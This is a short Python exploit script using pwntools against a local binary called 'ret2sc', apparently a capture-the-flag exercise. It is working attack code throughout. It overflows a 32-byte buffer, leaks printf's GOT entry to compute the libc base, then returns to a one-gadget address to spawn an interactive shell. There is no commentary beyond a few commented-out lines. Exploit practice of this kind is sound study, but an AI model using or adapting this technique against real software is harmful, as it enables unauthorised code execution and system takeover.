from pwn import *

s = process("./ret2sc")
e = ELF("./ret2sc")
#context.log_level = 'debug'

magic = 0x3a80e
pr = 0x8048359
s.sendlineafter('Name:',asm(shellcraft.sh()))

payload = "A"*32
#payload += p32(0x804a060) 
payload += p32(e.plt['printf'])
payload += p32(pr)
payload += p32(e.got['printf'])
payload += p32(0x080484CD)
s.sendlineafter('best:',payload)

libc=u32(s.recv(4))
libc_base = libc -0x49020
log.success(hex(libc_base))

oneshot = libc_base + magic
s.sendlineafter('Name:', "asdf")
payload2 = "A"*32
payload2 += p32(oneshot)
s.sendlineafter('best:',payload2)

s.interactive()
